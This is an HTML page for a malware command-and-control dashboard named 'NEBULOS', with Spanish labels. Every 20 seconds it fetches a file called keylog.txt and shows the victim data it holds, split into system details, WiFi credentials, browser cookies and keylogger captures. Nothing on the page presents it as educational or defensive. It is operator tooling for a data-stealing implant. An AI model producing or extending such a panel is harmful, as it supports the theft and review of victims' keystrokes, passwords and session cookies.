<!DOCTYPE html>
<html>
<head>
    <title>NEBULOS | C2 CONTROL</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .box { border: 2px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #003b00; }
        .nav { margin-bottom: 20px; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; cursor: pointer; }
        button:hover, .active { background: #00ff41; color: #000; font-weight: bold; }
        pre { white-space: pre-wrap; height: 500px; overflow: auto; border: 1px inset #003b00; padding: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>[ NEBULOS SYSTEM ACTIVATED ]</h2>
        <div class="nav">
            <button onclick="view('sys')">SISTEMA</button>
            <button onclick="view('wifi')">WIFI</button>
            <button onclick="view('nav')">NAVEGADOR/COOKIES</button>
            <button onclick="view('key')">KEYLOGGER</button>
            <button onclick="view('all')">VER TODO</button>
        </div>
        <pre id="console">Estableciendo enlace...</pre>
    </div>

    <script>
        let raw = "";
        async function update() {
            const r = await fetch('keylog.txt?t=' + Math.random());
            if(r.ok) { raw = await r.text(); view('all'); }
        }
        function view(mode) {
            const c = document.getElementById('console');
            if(mode==='sys') c.textContent = raw.split('--- SISTEMA ---')[1]?.split('--- WIFI ---')[0];
            else if(mode==='wifi') c.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAVEGADOR ---')[0];
            else if(mode==='nav') c.textContent = raw.split('--- NAVEGADOR ---')[1]?.split('--- KEYLOGGER ---')[0];
            else if(mode==='key') c.textContent = raw.split('--- KEYLOGGER ---')[1];
            else c.textContent = raw;
        }
        setInterval(update, 20000); update();
    </script>
</body>
</html>
